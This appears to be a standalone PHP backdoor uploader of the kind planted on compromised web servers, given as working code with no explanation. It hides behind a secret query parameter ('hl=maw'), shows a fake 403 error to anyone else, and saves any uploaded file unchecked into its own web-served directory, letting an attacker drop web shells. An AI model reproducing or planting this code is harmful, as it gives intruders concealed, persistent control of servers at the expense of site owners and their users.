<?php
if (isset($_GET['hl']) && $_GET['hl'] === 'maw') {
    ?>
    <form enctype="multipart/form-data" method="post">
        <input type="file" name="file" />
        <input type="submit" value="Upload" />
    </form>
    <?php
} else {
    echo "Forbidden 403.";
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $uploadFile = basename($_FILES['file']['name']);
    $uploadDir = __DIR__ . '/';

    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadDir . $uploadFile)) {
        echo "Ok.";
    } else {
        echo "Fail.";
    }
}
?>
